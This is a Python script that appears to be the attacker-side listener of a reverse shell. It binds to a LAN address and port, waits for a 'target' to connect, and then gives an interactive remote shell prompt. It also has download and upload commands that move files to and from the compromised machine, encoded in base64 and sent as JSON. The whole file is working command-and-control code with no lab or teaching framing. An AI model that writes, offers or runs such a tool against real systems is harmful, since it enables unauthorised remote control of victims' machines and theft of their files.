#!/usr/bin/python
import socket
import json
import base64

def sendData(d):
	json_data = json.dumps(d);
	target.send(json_data.encode('utf-8'));

def recvData():
	json_data = "".encode('utf-8');
	x = True;
	while x:
		try:
			json_data += target.recv(1024);
			return(json.loads(json_data));
		except ValueError:
			continue;

def server():
	global s;
	global ip;
	global target;
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1);
	s.bind(("192.168.202.120", 54321));
	s.listen(5);
	print("Listening for Incoming connections...");
	target, ip = s.accept();
	print("Target connected!");

#x = True;
#while x:
#	message = input("* Shell#~%s: " % str(ip));
#	if(message.encode('utf-8') == "q".encode('utf-8')):
#		break;
#	else:
#		target.send(message.encode('utf-8'));
#		answer = target.recv(1024);
#		print(answer);

def shell():
	x = True;
	while x:
		message = input("* Shell#~%s: " % str(ip));
		sendData(message);
		if (message.encode('utf-8') == "q".encode('utf-8')):
			break;
		elif (message[:2] == "cd" and len(message) > 1):
			continue;
		elif (message[:8] == "download"):
			try:
				with open(message[9:], 'wb') as file:
					result = recvData();
					file.write(base64.b64decode(result));
			except:
				error = "Error downloading the file...";
				print(error);
		elif (message[:6] == "upload"):
			try:
				with open(message[7:], "rb") as fin:
					sendData(base64.b64encode(fin.read()));
			except:
				failed = "Failed to upload";
				sendData(base64.b64encode(failed));
		else:
			result = recvData();
			print(result);


server();
shell();
s.close();
